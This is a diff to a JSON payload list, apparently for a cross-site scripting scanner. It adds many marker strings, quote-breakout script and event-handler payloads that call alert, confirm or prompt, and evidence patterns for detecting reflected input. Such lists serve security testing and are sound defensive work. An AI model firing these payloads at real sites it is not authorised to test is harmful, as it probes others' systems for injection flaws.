@@ -4,11 +4,41 @@
   "light_payloads": {
     "string": [
       "<xss-test>",
+      "xss-test",
       "\"><xss-test>",
-      "'><xss-test>"
+      "'><xss-test>",
+      "<b>xss-test</b>",
+      "<i>xss-test</i>",
+      "<u>xss-test</u>",
+      "<xss-test/>",
+      "<test>xss-test</test>",
+      "\"><b>xss-test</b>",
+      "'><b>xss-test</b>",
+      "\"><i>xss-test</i>",
+      "'><i>xss-test</i>",
+      "\"><u>xss-test</u>",
+      "'><u>xss-test</u>",
+      "&lt;xss-test&gt;",
+      "%3Cxss-test%3E",
+      "javascript:xss-test",
+      "\"><input value=xss-test>",
+      "'><input value=xss-test>",
+      "\"><textarea>xss-test</textarea>",
+      "'><textarea>xss-test</textarea>",
+      "\"><svg>xss-test</svg>",
+      "'><svg>xss-test</svg>"
     ],
     "unknown": [
-      "<xss-test>"
+      "<xss-test>",
+      "xss-test",
+      "\"><xss-test>",
+      "'><xss-test>",
+      "<b>xss-test</b>",
+      "<i>xss-test</i>",
+      "&lt;xss-test&gt;",
+      "%3Cxss-test%3E",
+      "\"><input value=xss-test>",
+      "'><input value=xss-test>"
     ]
   },
   "deep_payloads": {
@@ -16,15 +46,127 @@
       "<script>alert(1)</script>",
       "\"><script>alert(1)</script>",
       "'><script>alert(1)</script>",
-      "<img src=x onerror=alert(1)>"
+      "</script><script>alert(1)</script>",
+      "\"></script><script>alert(1)</script>",
+      "'></script><script>alert(1)</script>",
+
+      "<img src=x onerror=alert(1)>",
+      "\"><img src=x onerror=alert(1)>",
+      "'><img src=x onerror=alert(1)>",
+      "<img src=invalid onerror=alert(1)>",
+      "\"><img src=invalid onerror=alert(1)>",
+      "'><img src=invalid onerror=alert(1)>",
+
+      "<svg onload=alert(1)>",
+      "\"><svg onload=alert(1)>",
+      "'><svg onload=alert(1)>",
+      "<svg><script>alert(1)</script></svg>",
+      "\"><svg><script>alert(1)</script></svg>",
+      "'><svg><script>alert(1)</script></svg>",
+
+      "<body onload=alert(1)>",
+      "\"><body onload=alert(1)>",
+      "'><body onload=alert(1)>",
+
+      "<iframe src=javascript:alert(1)>",
+      "\"><iframe src=javascript:alert(1)>",
+      "'><iframe src=javascript:alert(1)>",
+
+      "<input autofocus onfocus=alert(1)>",
+      "\"><input autofocus onfocus=alert(1)>",
+      "'><input autofocus onfocus=alert(1)>",
+
+      "<details open ontoggle=alert(1)>",
+      "\"><details open ontoggle=alert(1)>",
+      "'><details open ontoggle=alert(1)>",
+
+      "<marquee onstart=alert(1)>x</marquee>",
+      "\"><marquee onstart=alert(1)>x</marquee>",
+      "'><marquee onstart=alert(1)>x</marquee>",
+
+      "<a href=javascript:alert(1)>click</a>",
+      "\"><a href=javascript:alert(1)>click</a>",
+      "'><a href=javascript:alert(1)>click</a>",
+
+      "<div onmouseover=alert(1)>x</div>",
+      "\"><div onmouseover=alert(1)>x</div>",
+      "'><div onmouseover=alert(1)>x</div>",
+
+      "<p onclick=alert(1)>x</p>",
+      "\"><p onclick=alert(1)>x</p>",
+      "'><p onclick=alert(1)>x</p>",
+
+      "<math><mtext></mtext><script>alert(1)</script></math>",
+      "\"><math><mtext></mtext><script>alert(1)</script></math>",
+      "'><math><mtext></mtext><script>alert(1)</script></math>",
+
+      "\"><script>confirm(1)</script>",
+      "'><script>confirm(1)</script>",
+      "<script>confirm(1)</script>",
+
+      "\"><script>prompt(1)</script>",
+      "'><script>prompt(1)</script>",
+      "<script>prompt(1)</script>",
+
+      "\"><img src=x onerror=confirm(1)>",
+      "'><img src=x onerror=confirm(1)>",
+      "<img src=x onerror=confirm(1)>",
+
+      "\"><svg onload=confirm(1)>",
+      "'><svg onload=confirm(1)>",
+      "<svg onload=confirm(1)>",
+
+      "\"><script>alert(document.domain)</script>",
+      "'><script>alert(document.domain)</script>",
+      "<script>alert(document.domain)</script>",
+
+      "\"><img src=x onerror=alert(document.domain)>",
+      "'><img src=x onerror=alert(document.domain)>",
+      "<img src=x onerror=alert(document.domain)>"
     ],
     "unknown": [
-      "<script>alert(1)</script>"
+      "<script>alert(1)</script>",
+      "\"><script>alert(1)</script>",
+      "'><script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "\"><img src=x onerror=alert(1)>",
+      "'><img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "\"><svg onload=alert(1)>",
+      "'><svg onload=alert(1)>",
+      "<input autofocus onfocus=alert(1)>",
+      "\"><input autofocus onfocus=alert(1)>",
+      "'><input autofocus onfocus=alert(1)>",
+      "<a href=javascript:alert(1)>click</a>",
+      "\"><a href=javascript:alert(1)>click</a>",
+      "'><a href=javascript:alert(1)>click</a>"
     ]
   },
   "evidence_patterns": [
     "<xss-test>",
+    "xss-test",
+    "<b>xss-test</b>",
+    "<i>xss-test</i>",
+    "<u>xss-test</u>",
     "<script>alert(1)</script>",
-    "onerror=alert(1)"
+    "</script><script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "onerror=alert(1)",
+    "onload=alert(1)",
+    "onfocus=alert(1)",
+    "ontoggle=alert(1)",
+    "onstart=alert(1)",
+    "onmouseover=alert(1)",
+    "onclick=alert(1)",
+    "javascript:alert(1)",
+    "<svg onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<a href=javascript:alert(1)>",
+    "alert(document.domain)",
+    "confirm(1)",
+    "prompt(1)"
   ]
 }
